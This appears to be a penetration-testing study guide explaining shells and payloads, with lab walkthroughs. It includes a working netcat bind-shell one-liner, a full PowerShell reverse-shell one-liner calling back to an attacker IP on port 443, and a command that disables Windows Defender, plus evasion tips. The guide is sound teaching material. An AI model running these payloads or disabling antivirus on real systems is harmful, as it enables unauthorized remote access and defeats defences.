# Shells basics

## Table of Contents
1. [What Is a Shell?](#1-what-is-a-shell)
2. [Why Bother Getting a Shell?](#2-why-bother-getting-a-shell)
3. [Three Ways to Think About "Shell"](#3-three-ways-to-think-about-shell)
4. [What Is a Payload?](#4-what-is-a-payload)
5. [Bind Shells](#5-bind-shells)
6. [Hands-On: Building a Bind Shell with Netcat](#6-hands-on-building-a-bind-shell-with-netcat)
7. [Reverse Shells](#7-reverse-shells)
8. [Hands-On: A Windows Reverse Shell with PowerShell](#8-hands-on-a-windows-reverse-shell-with-powershell)
9. [Bind vs Reverse — Decision Flow](#9-bind-vs-reverse--decision-flow)
10. [Cheat Sheet](#10-cheat-sheet)
11. [Big-Picture Takeaways](#11-big-picture-takeaways)

---

## 1. What Is a Shell?

A **shell** is just a program that lets a human type commands into a computer and see the text that comes back out. Everyday examples: Bash, Zsh, cmd.exe, and PowerShell.

> **Analogy:** Think of a shell like the steering wheel and pedals of a car. The car (operating system) can do a lot, but you need an interface to actually control it. The shell is that interface — except instead of turning and braking, you're typing commands.

In penetration testing (the practice of legally attacking systems to find weaknesses before real attackers do), getting a shell on someone else's machine usually means you've successfully exploited a vulnerability or slipped past a security control, and now you have an interactive command-line session on that machine. People in the field describe this moment casually:

- "I caught a shell."
- "I popped a shell!"
- "I dropped into a shell!"
- "I'm in!"

All of these mean the same thing: *I now have remote control of a command line on the target computer.*

## 2. Why Bother Getting a Shell?

A shell gives you **direct access** to the operating system, its commands, and its file system. Once you have that, you can:

- Look for ways to escalate your privileges (go from a low-level user to an admin/root)
- Pivot (use the compromised machine as a stepping stone to attack others on the same network)
- Transfer files in and out
- Maintain **persistence** (stay quietly logged in so you have time to keep working)

Without a shell, your options on a target machine are extremely limited — you're mostly just poking at it from the outside.

Command-line shells also have stealth and efficiency advantages over graphical remote access (like VNC or RDP, which show a full desktop):
- They're generally **harder to detect**.
- They're **faster to navigate**.
- They're **easier to automate** with scripts.

### The Three Lenses on "Shell"

| Perspective | What It Means |
|---|---|
| **Computing** | The everyday text-based environment used to run commands on a PC — Bash, Zsh, cmd, PowerShell. |
| **Exploitation & Security** | The *result* of exploiting a vulnerability or bypassing a security control to get interactive access to a machine (e.g., triggering the EternalBlue exploit to get a Windows cmd prompt remotely). |
| **Web** | A **web shell** — a script uploaded or injected onto a vulnerable web server that lets an attacker run commands, read/write files, or cause damage, usually controlled just by visiting it in a browser. |

## 3. Three Ways to Think About "Shell"

(Covered above in the table — included here because the source material treats this as its own concept worth separating out: a *shell* is not one single thing. It changes meaning slightly depending on whether you're talking about everyday computing, an exploitation outcome, or a web-based attack surface.)

## 4. What Is a Payload?

A **payload** is a term borrowed from several fields, but it always means roughly "the actual content/action being delivered," as opposed to the wrapper around it.

| Field | Definition of "Payload" |
|---|---|
| Networking | The actual data inside a network packet (as opposed to the header information around it) |
| Basic Computing | The part of an instruction that defines *what action to take*, with headers/protocol info stripped away |
| Programming | The data a programming language instruction is carrying |
| Exploitation & Security | Code written specifically to exploit a vulnerability — this can include malware like ransomware |

> **Analogy:** If a network packet is like a shipping envelope, the payload is the letter inside it. Headers and protocol info are the envelope and stamp — necessary for delivery, but not the actual message.

In this module, "payload" means: *the code or commands we send to a target in order to get a shell running on it.*

## 5. Bind Shells

### What Is It?

In a **bind shell**, the *target* machine starts a listener (a program waiting for an incoming connection) and the attacker's machine connects *to* the target.

```
[Attacker] ----connects to----> [Target: listener running on a port]
```

Think of it like the target opening its own front door and waiting for someone to knock — the attacker just has to walk up and knock on the right door (IP address + port).

### Challenges with Bind Shells

- A listener must already be running on the target (or you need a way to start one).
- Network admins usually configure strict **incoming** firewall rules and NAT/PAT (address translation that hides internal machines from the internet) at the network edge — so you typically need to already be on the internal network.
- The target's own OS firewall (Windows Firewall, iptables, etc.) will likely block incoming connections that aren't tied to a trusted, recognized application.

### The Tool: Netcat

**Netcat (`nc`)** is described as the "Swiss-Army knife" of networking tools. It can:
- Work over TCP, UDP, and Unix sockets
- Support IPv4 and IPv6
- Open and listen on network sockets
- Act as a proxy
- Send and receive plain text

In a bind shell setup, Netcat runs as the **client** on the attack box, and the **server** role is played by the target.

## 6. Hands-On: Building a Bind Shell with Netcat

### Step 1 — Just Testing the Connection (Not a Shell Yet)

**On the target (acting as server), start a listener:**
```bash
$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```
> `-l` = listen mode, `-v` = verbose (show connection info), `-n` = don't resolve DNS names, `-p 7777` = use port 7777.

**On the attacker box (acting as client), connect to that listener:**
```bash
$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```
> This just connects to the target's IP on port 7777.

**Back on the target**, you'll see the connection land:
```bash
$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

At this point you can type plain text between the two sides to prove the pipe works:

**Client sends a message:**
```bash
$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy
```

**Server receives it:**
```bash
$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```

⚠️ **Important distinction:** this is *not* a shell yet. It's just a raw text pipe — you can send messages back and forth, but you can't run OS commands through it.

### Step 2 — Turning the Pipe into an Actual Shell

**On the target (server side), run:**
```bash
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Annotated breakdown:
| Piece | What it does |
|---|---|
| `rm -f /tmp/f` | Deletes any old leftover file named `/tmp/f`, just in case |
| `mkfifo /tmp/f` | Creates a **named pipe** — a special file that lets data flow between processes, like a pneumatic tube between two rooms |
| `cat /tmp/f \| /bin/bash -i 2>&1` | Feeds whatever comes through the pipe into an *interactive* Bash shell, and merges error output (`2>&1`) with normal output so nothing gets lost |
| `\| nc -l 10.129.41.200 7777 > /tmp/f` | Sends Bash's output back out over Netcat, and routes incoming data back into the pipe, completing the loop |

This whole line is itself a **payload** — the exact commands needed to "serve up" a working shell instead of just a text pipe.

**On the attacker box (client side), connect as before:**
```bash
$ nc -nv 10.129.41.200 7777
Target@server:~$
```

That `Target@server:~$` prompt means you now have a real, interactive bind shell — you can run OS commands on the target.

**Caveat from the lab:** this exercise assumed no firewalls, antivirus, IDS/IPS, or authentication in the way — real-world engagements are rarely this clean. It's meant purely to build the mental model.

**Why bind shells are easier to defend against:** since the connection comes *in* to the target, it's more likely to get noticed and blocked by firewalls — even on commonly-used ports.

## 7. Reverse Shells

### What Is It?

In a **reverse shell**, the roles flip: the *attacker's* machine runs the listener, and the *target* is tricked (via some vulnerability, like a file upload flaw or command injection) into initiating the connection back to the attacker.

```
[Target] ----initiates connection----> [Attacker: listener running]
```

> **Analogy:** Instead of knocking on the target's door (bind shell), you trick the target into calling *you* on the phone. Admins are usually much more focused on watching who comes *in* than tracking every outbound call — so this is often less noticeable.

This matters because outbound connections are frequently overlooked by defenders — so a reverse shell gives you a better chance of going undetected than a bind shell does.

### A Helpful Resource

You don't need to write every reverse shell payload from scratch — community resources like the [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) collect ready-made commands, code snippets, and generators. One caution: experienced defenders often know these public resources too, and may tune their detections around them — so sometimes you'll need to customize a payload rather than use it exactly as published.

## 8. Hands-On: A Windows Reverse Shell with PowerShell

### Step 1 — Start the Listener on the Attack Box

```bash
$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

Why port **443**? That's the standard port for HTTPS traffic. Using it makes the outbound connection blend in, since almost every organization allows outbound HTTPS so employees can browse the web. Note, though, that a more advanced firewall doing **deep packet inspection** (actually examining the contents of traffic, not just checking IP/port) could still catch and block this — but that level of detection/evasion is beyond this module's scope.

### Step 2 — Check What's Available on the Target

Before picking a tool, ask: **what's actually installed on this target?** Netcat isn't built into Windows by default, so relying on it there is risky unless you've transferred a copy over yourself — which has its own challenges. The preferred approach is to use what's already present on the system (a practice called **"living off the land"**) — in this case, PowerShell, which ships with modern Windows.

### Step 3 — Run the PowerShell One-Liner on the Target

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Annotated breakdown (high level — this is dense one-liner code):
| Part | What it does |
|---|---|
| `powershell -nop -c "..."` | Runs PowerShell with no profile loading (`-nop`, for speed/stealth) and executes the quoted command block |
| `New-Object System.Net.Sockets.TCPClient('10.10.14.158',443)` | Opens a TCP connection out to the attacker's IP and port 443 — this *is* the "calling home" step |
| `$stream = $client.GetStream()` | Grabs the data stream tied to that connection, so data can flow both ways |
| `while(... $stream.Read(...))` | Continuously listens for incoming commands sent by the attacker |
| `iex $data 2>&1 \| Out-String` | `iex` = "Invoke-Expression," i.e., *run whatever command text was received*, capturing both normal and error output |
| `$stream.Write($sendbyte,...)` | Sends the command's output back to the attacker over the same connection |
| `$client.Close()` | Closes the connection when the loop ends |

This block of PowerShell code is itself referred to as **shell code** or the **payload**.

### Step 4 — What Actually Happened First

```
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

**Windows Defender blocked it.** From a defensive point of view, this is exactly the system working as intended. From the lab's offensive/learning point of view, it's an obstacle to understand and work around — in this controlled exercise, by disabling real-time antivirus protection (something only done here because the lab environment is fully owned and controlled by the practitioner, not something to do on systems you don't own or haven't been authorized to test).

**Disabling AV for lab purposes (in an administrator PowerShell window):**
```powershell
PS C:\Users\john> Set-MpPreference -DisableRealtimeMonitoring $true
```

### Step 5 — Success

```bash
$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\john> whoami
ws01\john
```

The `PS C:\Users\john>` prompt confirms the reverse shell connected successfully, and running `whoami` (a command that prints the current logged-in user) confirms you're interacting with the real target OS.

## 9. Bind vs Reverse — Decision Flow

```
                 Need a shell on a target?
                           |
             -----------------------------
             |                           |
   Can target accept        Target has outbound
   inbound connections?     access, but inbound
   (listener possible,      is tightly firewalled?
   firewall allows it)                |
             |                           |
            YES                        YES
             |                           |
      ┌──────────────┐          ┌───────────────────┐
      │  BIND SHELL   │          │  REVERSE SHELL     │
      │ Target listens│          │ Attacker listens,   │
      │ Attacker      │          │ target connects out │
      │ connects in   │          │ (often via exploit) │
      └──────────────┘          └───────────────────┘
             |                           |
      Easier for firewalls      Outbound traffic often
      to detect/block           overlooked — better odds
                                 of staying undetected
```

## 10. Cheat Sheet

| Command | Purpose |
|---|---|
| `nc -lvnp <port>` | Start a Netcat listener on a given port (`-l` listen, `-v` verbose, `-n` no DNS lookup, `-p` port) |
| `nc -nv <IP> <port>` | Connect to a remote host/port as a client |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l <IP> <port> > /tmp/f` | Classic Linux bind-shell payload using a named pipe + Bash + Netcat |
| `sudo nc -lvnp 443` | Start a reverse-shell listener on the attacker box, often on port 443 to blend in with HTTPS traffic |
| PowerShell TCP reverse shell one-liner (see Section 8) | Windows payload that connects out to an attacker-controlled listener and pipes command input/output over it |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Disables Windows Defender real-time protection (lab/authorized use only) |
| `whoami` | Prints the current logged-in user — useful first command to confirm shell access |

## 11. Big-Picture Takeaways

1. A **shell** is simply an interface for typing commands and seeing output — in security contexts, "getting a shell" means gaining interactive command-line control of a target machine.
2. A **payload** is the actual code/commands used to achieve something — in this context, to establish that shell connection.
3. **Bind shells** have the target listen and the attacker connect in; they're conceptually simple but easy for firewalls to block since the connection is inbound.
4. **Reverse shells** flip this — the attacker listens, and the target is made to connect out — which tends to slip past defenses more easily since outbound traffic is watched less closely.
5. **Netcat** is a flexible, foundational tool for building both bind and reverse shells, especially on Linux.
6. On Windows, native tools like **PowerShell** are often more reliable than bringing in outside tools like Netcat, following the "living off the land" principle.
7. Security controls — antivirus, firewalls, IDS/IPS — are designed to catch exactly this kind of activity, and this module's labs intentionally simplified or removed those controls purely to teach the underlying mechanics.
8. Real-world engagements are far messier than these clean lab exercises — firewalls, AV, and monitoring all add friction that this introductory material deliberately set aside.
